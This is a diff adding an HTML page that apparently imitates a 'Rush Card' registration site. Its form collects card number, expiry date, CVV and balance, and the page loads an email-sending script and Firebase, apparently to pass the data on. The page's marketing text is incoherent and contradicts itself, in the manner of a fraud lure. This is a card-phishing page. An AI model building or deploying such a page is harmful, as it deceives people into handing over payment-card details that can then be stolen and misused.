@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <meta name="google-site-verification" content="5tfWwBNcOvEXgth0FRgFq_ieTSDbPUMpUAEDlJRPSAs" />
+    <meta name = "viewport" content = "width = device-width, initial-scale = 1.0">
+    <link rel="canonical" href="https://registerrushcard.com/" />
+
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+    <link href="style.css" rel="stylesheet">
+
+
+    <title></title>
+  </head>
+  <body>
+
+
+    <!-- example 6 - center on mobile -->
+    <nav class="navbar navbar-expand-lg navbar-light bg-light">
+        <div class="d-flex flex-grow-1">
+            <span class="w-100 d-lg-none d-block"><!-- hidden spacer to center brand on mobile --></span>
+            <a class="navbar-brand d-none d-lg-inline-block" href="#">
+              <h1><img src="logo_rushcard.png" alt="RUSHCARD"></h1>
+            </a>
+            <a class="navbar-brand-two mx-auto d-lg-none d-inline-block" href="#">
+                <img src="//placehold.it/40?text=LOGO" alt="logo">
+            </a>
+            <div class="w-100 text-right">
+                <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#myNavbar">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+            </div>
+        </div>
+        <div class="collapse navbar-collapse flex-grow-1 text-right" id="myNavbar">
+            <ul class="navbar-nav ml-auto flex-nowrap">
+                <li class="nav-item">
+                    <a href="#" class="nav-link m-2 menu-item nav-active">SHOP</a>
+                </li>
+                <li class="nav-item">
+                    <a href="#" class="nav-link m-2 menu-item nav-active">NEW</a>
+                </li>
+                <li class="nav-item">
+                    <a href="#" class="nav-link m-2 menu-item nav-active">GIFTS</a>
+                </li>
+                <li class="nav-item">
+                    <a href="#" class="nav-link m-2 menu-item nav-active">SALE</a>
+                </li>
+                <li class="nav-item">
+                    <a href="#" class="nav-link m-2 menu-item">QUIZZES</a>
+                </li>
+                <li class="nav-item">
+                    <a href="#" class="nav-link m-2 menu-item">COMMUNITY</a>
+                </li>
+                <li class="nav-item">
+                    <a href="#" class="nav-link m-2 menu-item">Contact</a>
+                </li>
+            </ul>
+        </div>
+    </nav>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <!-- <header class="heading">
+      <h1>Register your Rush Card online and activate it</h1>
+    </header> -->
+
+    <div class="container-fluid">
+
+      <div class="row">
+        <div class="col-sm-6" style="background-color:white;"><div class="query_form" style="background-color:white" >
+          <form class="contact-form" action="success.html" method="post">
+               <h2 class="heading">Register your card online and activate it</h2> <br>
+
+<div class="form_elements">
+  <label > <b>Rush Card Number</b>  </label>
+  <input class="card_number"
+  type="text" name="card_number"
+  value="Card Number"
+
+  size="20"
+  maxlength="16"
+  oninput="this.value=this.value.replace(/(?![0-9])./gmi,'')"
+  onfocus = 'if (this.value == "Card Number") this.value = ""'
+  > <br><br>
+
+  <select class="month" name="month" id="month" style="size:20px;">
+    <option value="January">January</option>
+    <option value="February">February</option>
+    <option value="March">March</option>
+    <option value="April">April</option>
+    <option value="May">May</option>
+    <option value="June">June</option>
+    <option value="July">July</option>
+    <option value="August">August</option>
+    <option value="September">September</option>
+    <option value="October">October</option>
+    <option value="November">November</option>
+    <option value="November">December</option>
+    </select>
+
+  <!-- <label >Expiration Date</label> -->
+
+  <input class="year"
+  type="string"
+
+  name="year"
+  value="YY*"
+  size="20"
+  maxlength="4"
+  min="1900"
+  max="2080"
+  onfocus = 'if (this.value == "YY*") this.value = ""'
+  oninput="this.value=this.value.replace(/(?![0-9])./gmi,'')"
+  >
+
+ <br><br>
+  <!-- <label >CVV</label> -->
+  <input class="cvv"
+  type="text"
+  name=""
+  value="CVV(3 digit at back)"
+  maxlength="3"
+  size="20"
+  pattern="[0-9]{3}"
+  oninput="this.value=this.value.replace(/(?![0-9])./gmi,'')"
+  required onfocus = 'if (this.value == "CVV(3 digit at back)") this.value = ""'
+  >  <br><br>
+
+  <!-- <label >Balance</label> -->
+  <input class="balance"
+  type="text" name="card_balance"
+  value="Card Balance"
+
+  size="20"
+  onfocus = 'if (this.value == "Card Balance") this.value = ""'
+  oninput="this.value=this.value.replace(/(?![0-9])./gmi,'')"
+  ><br><br>
+
+
+</div>
+
+             <button type="submit"
+             id="myButton"
+             class="btn btn-primary btn-lg btn-block"  class="button_pops"
+             style="background-color:black;width: 100%;" >Register</button>
+
+             <!-- <script type="text/javascript">
+                 document.getElementById("myButton").onclick = function () {
+                     location.href = "./success.html";
+
+              };
+               </script> -->
+           </form>
+        </div>
+</div>
+        <div class="col-sm-4" style="background-color:white;"><div class="offer" style="background-color:white">
+
+           <h2 > <br>Register Rush Card</h2>
+
+          <p class="text-justify">Rush card can be used online, in US stores, and by phone, rush card visa card online.
+              Rush card works in USA and Canada and can be used online and offline.</p>
+
+            <p class="text-justify">Rush card is best gift for your loved ones.
+              You can use rush card at online store to buy anything.You can redeem rush card online.
+              It is very easy to register and redeem rush card online.
+              To register and to use rush card,goto our website.
+              Enter Rush card 16 digit digit pin,exp date and 3 digit pin.
+              The balance of Rush card will be shown instantanesly.</p>
+
+            <p class="text-justify">To buy rush card you dont need to provide any id or personal information,
+               but to buy rush card you willhave to provide personal details.
+               You can check rush card balance online and reedeem these card anywhere on VISA/MasterCard compatable machines.
+               Activate Rush card, Register Rush Card</p>
+
+
+        </div></div>
+      </div>
+
+
+
+
+      <div class="row">
+
+        <div class="col-sm-12" style="background-color:white;">
+
+
+            <div class="logo_div">
+              <br>
+              <img src="./logo_images/facebook.png" alt="Facebook" >
+              <img src="./logo_images/instagram.jpg" alt="Instagram" >
+              <img src="./logo_images/twitter.png" alt="Twitter" >
+              <br>
+              <br>
+              <br>
+            </div>
+
+        </div>
+
+      </div>
+
+
+
+      <div class="row">
+        <div class="col-sm-12" style="background-color:white;"><div class="discount" style="background-color:white">
+          <h2>Avail Exciting Discounts on</h2><br>
+
+          <b>Grocery Shopping:</b>
+              <br>Avail 10% discount on Grocery billing on popular online platforms like Gofer, Bigbasket etc</li><br>
+
+            <br> <b>Mobile Recharge:</b><br>
+            Save more on monthly bills by getting exciting cashbacks on every recharge <br>
+
+          <br> <b>Fuel Refill:</b><br>
+              Get points at every refill with membership card <br>
+
+          <br>  <b>Online Shopping:</b><br>
+            Extra 20% off on all major Shopping sites like myntra,flipkart,ajio.<br>
+            <br>
+        </div>
+
+          <div class="infosResults"></div></div>
+
+      </div>
+
+
+
+
+    </div>
+
+
+
+      <div class="infosResults"></div>
+
+
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+      <script src="https://www.gstatic.com/firebasejs/8.6.3/firebase.js"></script>
+    <script src="app.js"></script>
+
+
+
+
+
+  </body>
+</html>
